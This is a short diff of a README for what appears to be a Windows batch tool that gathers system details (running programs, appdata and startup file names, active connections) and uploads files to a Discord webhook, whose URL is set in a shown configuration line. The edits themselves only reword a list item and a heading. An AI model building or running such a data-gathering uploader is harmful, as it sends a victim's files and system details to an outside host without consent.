@@ -9,7 +9,7 @@ https://solo.to/buxh
 
 ## Features
 - Attempts to find active connections
-- Collects all running exe's names
+- Collects all running exe names
 - Locates all local appdata & appdata file names
 - Gathers all start up file names
 - Opens start up folders
@@ -30,7 +30,7 @@ set webhook=https://discord.com/api/webhooks/172979283729726/URnyhuVL24vJ9pAFOeB
 ```
 iv. Save the file and run!
 
-## Sample
+## Webhook sample
 ```bat
 echo  [!] Uploading files to server...
 
